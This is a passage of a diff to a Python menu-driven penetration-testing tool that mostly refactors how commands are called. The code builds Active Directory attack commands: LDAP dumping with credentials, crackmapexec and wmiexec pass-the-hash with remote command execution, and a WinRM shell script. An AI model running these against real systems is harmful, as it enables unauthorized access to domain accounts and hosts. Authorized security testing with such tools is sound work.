-      CMD = PRO + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full"
-      command(CMD)
+      command(PRO + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + HST.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -GUC --da --full")
 
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
@@ -1227,11 +1219,20 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='49':
-      CMD = "ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" ")
-      os.system(CMD)
-      print "[+] Directory contents"
-      os.system("ls -la ./" + DIR.rstrip(" "))
-      raw_input("\nPress ENTER to continue...")  
+      command("ldapdomaindump -u '" + HST.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
+      print "\nChecking downloaded files: "
+      command("ls -la ./" + DIR.rstrip(" "))
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : 1.0
+# Details : Menu option selected - 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='50':
+      exit(1) 
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1253,8 +1254,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='52':
-      CMD = "crackmapexec smb " + TIP.rstrip(" ") + " -u Administrator -H 000:" + PA[0] + " -x 'net user Administrator /domain' --exec-method smbexec"
-      command(CMD)
+      command("crackmapexec smb " + TIP.rstrip(" ") + " -u Administrator -H 000:" + PA[0] + " -x 'net user Administrator /domain' --exec-method smbexec")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1265,8 +1265,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='53':
-      CMD = PRO + "wmiexec.py -hashes :" + PA[0] + " administrator@" + TIP.rstrip(" ")
-      command(CMD)
+      command(PRO + "wmiexec.py -hashes :" + PA[0] + " administrator@" + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1343,8 +1342,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='60':
-      CMD = "pftp " + TIP.rstrip(" ")
-      command(CMD)
+      command("pftp " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1355,8 +1353,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='61':
-      CMD = "ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ")
-      command(CMD)
+      command("ssh -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1367,8 +1364,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='62':
-      CMD = "telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ")
-      command(CMD)
+      command("telnet -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1379,14 +1375,13 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='63':
-      CMD = "nc -l " + USR.rstrip(" ") + " " + TIP.rstrip(" ")
-      command(CMD)
+      command("nc -l " + USR.rstrip(" ") + " " + TIP.rstrip(" "))
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : 1.0
-# Details : Menu option selected - Winrm
+# Details : Menu option selected - Create Win_Remote login
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
@@ -1399,8 +1394,8 @@ while True:
       os.system('echo "  password: \'"' + PAS.rstrip(" ") + '"\'," >> winshell.rb')
       os.system('echo ")" >> winshell.rb')
       os.system("cat shell.txt >> winshell.rb") # ADD REST WHEN YOU HAVE TIME!!
-      CMD = "ruby winshell.rb"
-      command(CMD)
+
+      command("ruby winshell.rb")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1456,16 +1451,5 @@ while True:
 
    if selection =='69':
       exit(1)   
-
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : 1.0
-# Details : Menu option selected - 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='70':
-      exit(1) 
 
 #Eof...
